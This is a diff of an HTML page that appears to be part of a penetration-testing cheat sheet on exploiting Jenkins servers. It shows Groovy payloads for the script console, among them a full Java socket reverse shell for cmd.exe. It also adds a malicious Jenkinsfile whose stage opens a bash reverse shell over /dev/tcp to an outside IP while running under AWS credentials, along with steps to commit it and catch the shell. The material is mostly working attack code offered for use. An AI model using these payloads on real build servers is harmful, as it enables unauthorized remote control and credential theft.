@@ -31,6 +31,8 @@
 
             <h2>Exploitation</h2>
             <ul>
+                <h3>Jenkins script console</h3>
+                <ul>
                 <p>The best way of gaining comman execution in a Jenkins server is through the script console. </p>
                 <p>To access that console follow: <b>Build execution status</b>-> <b>Click on the master node or otherone if exists</b> -> <b>Script console</b></p>
                 <p>This console allows a user to run Apache Groovy scripts, which are an object-oriented Java-compatible language. Here are some payloads you could use</p>
@@ -58,8 +60,30 @@ p.waitFor()</code></pre>
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>    
-
+                </ul>     
                 
+                <h3>Modifying the pipeline to obtain RCE</h3>
+                <ul>
+                    <p>In case you found a way to modify the <b>JenkinsFile</b> you could potentially execute arbitrary commands on the server. Example:</p>
+                    <pre><code class="language-groovy">pipeline {
+  agent any
+  stages {
+    stage('Send Reverse Shell') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
+            }
+          }
+        }
+      }
+    }
+  }
+}</code></pre>
+                <p>Due the usage of <b>isUnix()</b> the command will only be executed on Unix-like systems. So in windows system that command would create an error</p>
+                <p>Perform a commit and wait for the pipeline to execute and retrieve your reverse shell.</p>
+                </ul>
 
 
 
